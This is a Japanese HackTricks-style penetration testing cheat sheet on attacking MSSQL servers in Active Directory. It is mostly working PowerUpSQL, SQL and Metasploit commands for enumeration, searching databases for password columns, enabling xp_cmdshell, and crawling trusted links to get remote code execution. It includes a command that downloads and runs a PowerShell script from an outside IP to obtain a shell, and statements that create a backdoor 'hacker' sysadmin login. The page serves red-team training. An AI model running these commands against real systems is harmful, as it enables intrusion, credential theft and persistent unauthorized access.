# MSSQL AD悪用

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学びましょう</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れます
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングトリックを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## **MSSQL列挙/発見**

PowerUpSQLというPowerShellモジュールは、この場合非常に便利です。
```powershell
Import-Module .\PowerupSQL.psd1
```
### ドメインセッションなしでネットワークから列挙
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### ドメイン内からの列挙
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQLの基本的な悪用

### データベースへのアクセス
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

MSSQLホスト内で**コマンドを実行**することも可能かもしれません
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL基本ハッキングトリック

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL信頼されたリンク

もしMSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合、ユーザーが信頼されたデータベースに権限を持っている場合、**信頼関係を使用して他のインスタンスでもクエリを実行できる**ようになります。これらの信頼関係は連鎖することができ、ユーザーはいくつかの構成ミスがあるデータベースを見つけてコマンドを実行できるかもしれません。

**データベース間のリンクは、フォレストトラストを超えても機能します。**

### Powershellの悪用
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Metasploitを使用して簡単に信頼されたリンクをチェックできます。
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
メタスプロイトはMSSQLの`openquery()`関数のみを悪用しようとします（つまり、`openquery()`でコマンドを実行できない場合は、コマンドを実行するために`EXECUTE`メソッドを**手動**で試す必要があります。詳細は以下を参照してください。）

### 手動 - Openquery()

**Linux**からは、**sqsh**と**mssqlclient.py**を使用してMSSQLコンソールシェルを取得できます。

**Windows**からは、[**HeidiSQL**](https://www.heidisql.com)のような**MSSQLクライアント**を使用してリンクを見つけ、コマンドを手動で実行することもできます。

_Windows認証を使用してログイン:_

![](<../../.gitbook/assets/image (805).png>)

#### 信頼できるリンクの検索
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../.gitbook/assets/image (713).png>)

#### 信頼できるリンクでクエリを実行する

リンクを介してクエリを実行します（例：新しいアクセス可能なインスタンスでより多くのリンクを見つける）：
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
二重引用符と単一引用符の使用を確認してください。それをそのまま使用することが重要です。
{% endhint %}

![](<../../.gitbook/assets/image (640).png>)

これらの信頼されたリンクチェーンを手動で永遠に続けることができます。
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
### マニュアル - EXECUTE

`openquery()` から `exec xp_cmdshell` のようなアクションを実行できない場合は、`EXECUTE` メソッドを使用してみてください。
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## ローカル特権昇格

**MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別な特権を持っています。これにより、アカウントは「認証後にクライアントを模倣する」ことができます。

多くの著者が考えた戦略は、SYSTEMサービスを、攻撃者が作成したローグまたは中間者サービスに認証させることです。このローグサービスは、SYSTEMサービスが認証しようとしている間にSYSTEMサービスを模倣することができます。

[SweetPotato](https://github.com/CCob/SweetPotato)には、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまなテクニックが収録されています。
